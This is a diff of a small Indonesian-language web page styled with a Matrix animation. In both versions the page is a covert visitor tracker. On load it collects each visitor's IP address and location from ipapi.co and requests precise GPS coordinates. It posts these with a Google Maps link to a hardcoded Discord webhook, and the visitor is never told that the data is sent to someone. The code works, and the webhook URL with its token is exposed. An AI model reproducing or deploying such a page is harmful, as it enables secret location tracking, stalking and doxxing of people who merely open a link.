@@ -4,37 +4,38 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Welcome to Basakencana</title>
-    <style>
-        body { margin: 0; background: black; color: #0f0; font-family: monospace; overflow: hidden; }
-        canvas { display: block; }
-        #info { position: absolute; top: 20px; left: 50%; transform: translateX(-50%); text-align: center; background: rgba(0,0,0,0.8); padding: 20px; border: 1px solid #0f0; border-radius: 10px; z-index: 10; }
-        #map { height: 300px; width: 100%; max-width: 500px; margin-top: 15px; border: 2px solid #0f0; border-radius: 8px; }
-    </style>
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
-    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+    <style>
+        body { margin: 0; background: black; color: #0F0; font-family: monospace; overflow: hidden; }
+        canvas { display: block; position: fixed; top: 0; left: 0; z-index: -1; }
+        #info { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); text-align: center; background: rgba(0,0,0,0.8); padding: 20px; border: 2px solid #0F0; border-radius: 8px; width: 300px; z-index: 10; }
+        #map { height: 200px; width: 100%; margin-top: 15px; border: 1px solid #0F0; border-radius: 4px; }
+    </style>
 </head>
 <body>
 
-    <div id="info">
-        <h2>WELCOME TO BASAKENCANA</h2>
-        <p id="status">Detecting visitor...</p>
-        <p id="ip"></p>
-        <p id="location"></p>
-        <div id="map"></div>
-    </div>
+<div id="info">
+    <h2>SELAMAT DATANG DI BASAKENCANA</h2>
+    <p id="status">Detecting visitor...</p>
+    <p id="ip"></p>
+    <p id="location"></p>
+    <div id="map"></div>
+</div>
 
-    <canvas id="matrix"></canvas>
+<canvas id="matrix"></canvas>
 
-    <script>
-// 1. WEBHOOK URL KAMU
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+
+<script>
+// 1. CONFIG
 const webhookURL = "https://discord.com/api/webhooks/1484113432583081984/Fkm8dj5XnVckc7du-HRYBFKAvdcxZ9jXcZqjJ_5G4hWa1rX0GUPVQ02P5as6o1Ok0xR";
 
-// 2. EFEK MATRIX (Opsional, biar keren)
+// 2. MATRIX BACKGROUND
 const canvas = document.getElementById('matrix');
 const ctx = canvas.getContext('2d');
 canvas.width = window.innerWidth;
 canvas.height = window.innerHeight;
-const letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*";
+const letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
 const fontSize = 16;
 const columns = canvas.width / fontSize;
 const drops = Array(Math.floor(columns)).fill(1);
@@ -44,75 +45,67 @@ function drawMatrix() {
     ctx.fillRect(0, 0, canvas.width, canvas.height);
     ctx.fillStyle = "#0F0";
     ctx.font = fontSize + "px monospace";
-    for (let i = 0; i < drops.length; i++) {
+    drops.forEach((y, i) => {
         const text = letters[Math.floor(Math.random() * letters.length)];
-        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
-        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
+        ctx.fillText(text, i * fontSize, y * fontSize);
+        if (y * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
         drops[i]++;
-    }
+    });
 }
 setInterval(drawMatrix, 33);
 
-// 3. FUNGSI KIRIM KE DISCORD
+// 3. FUNGSI KIRIM DISCORD
 async function sendToDiscord(data, mapsLink, metode) {
-    const pesan = {
+    const payload = {
         username: "BASAKENCANA TRACKER",
         embeds: [{
-            title: "🚨 PENGUNJUNG BARU TERDETEKSI!",
+            title: "🚨 PENGUNJUNG BARU!",
             color: 16711680,
             fields: [
-                { name: "🌐 IP Address", value: `**${data.ip}**`, inline: true },
-                { name: "📡 ISP", value: data.org || "Unknown", inline: true },
-                { name: "📍 Lokasi", value: `${data.city || '?'}, ${data.region || '?'}`, inline: false },
-                { name: "🎯 Metode", value: metode, inline: true },
-                { name: "🗺️ Google Maps", value: `[KLIK UNTUK LIHAT LOKASI](${mapsLink})`, inline: false }
+                { name: "🌐 IP", value: data.ip, inline: true },
+                { name: "📍 Lokasi", value: `${data.city}, ${data.country_name}`, inline: true },
+                { name: "🎯 Metode", value: metode, inline: false },
+                { name: "🗺️ Maps", value: `[KLIK LIHAT LOKASI](${mapsLink})` }
             ],
             timestamp: new Date()
         }]
     };
-
     try {
-        await fetch(webhookURL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(pesan)
-        });
-    } catch (e) { console.log("Gagal kirim ke Discord:", e); }
+        await fetch(webhookURL, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
+    } catch (e) { console.error(e); }
 }
 
-// 4. FUNGSI PELACAK UTAMA
+// 4. MAIN TRACKER
 async function trackVisitor() {
     try {
         const res = await fetch("https://ipapi.co/json/");
         const data = await res.json();
+        
+        document.getElementById('status').innerText = "Pengunjung Terdeteksi!";
+        document.getElementById('ip').innerText = "IP: " + data.ip;
+        document.getElementById('location').innerText = "Lokasi: " + data.city;
 
-        // Tampilkan di layar web
-        document.getElementById('status').innerText = "Visitor Detected!";
-        document.getElementById('ip').innerText = "IP Address: " + data.ip;
-        document.getElementById('location').innerText = "Location: " + data.city + ", " + data.country_name;
-
-        // Ambil GPS Akurat
         if ("geolocation" in navigator) {
-            navigator.geolocation.getCurrentPosition(async (position) => {
-                const lat = position.coords.latitude;
-                const lon = position.coords.longitude;
-                const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
+                const mLink = `https://www.google.com/maps?q=${lat},${lon}`;
                 
-                // Update map di layar web
+                // Tampilkan Map
                 const map = L.map('map').setView([lat, lon], 13);
                 L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
-                L.marker([lat, lon]).addTo(map).bindPopup("You are here").openPopup();
+                L.marker([lat, lon]).addTo(map).bindPopup("Lokasi Akurat").openPopup();
 
-                await sendToDiscord(data, mapsLink, "🎯 AKURAT (GPS)");
-            }, async (error) => {
-                const ipMaps = `https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
-                await sendToDiscord(data, ipMaps, "☁️ ESTIMASI (IP)");
+                await sendToDiscord(data, mLink, "🎯 AKURAT (GPS)");
+            }, async () => {
+                // Jika GPS ditolak
+                const mLink = `https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
+                await sendToDiscord(data, mLink, "☁️ ESTIMASI (IP)");
             });
         }
-    } catch (err) { console.log("Error:", err); }
+    } catch (err) { console.error(err); }
 }
 
-// JALANKAN!
 trackVisitor();
 </script>
 </body>
